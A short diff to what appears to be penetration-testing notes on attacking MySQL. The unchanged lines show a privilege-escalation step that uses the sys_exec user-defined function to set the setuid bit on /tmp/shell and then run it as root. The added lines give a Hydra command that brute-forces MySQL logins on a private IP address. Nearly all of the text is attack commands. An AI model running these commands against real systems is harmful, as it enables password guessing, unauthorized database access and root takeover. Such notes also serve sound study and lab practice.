@@ -87,3 +87,6 @@ execute:
 - mysql> select sys_exec('chmod +s /tmp/shell');
 
 Ok now we can just execute the shell and chek identity with id.
+
+# Bruteforce (hydra)
+hydra -L usernames.txt -P passwords.txt 192.168.2.66 mysql -V -f
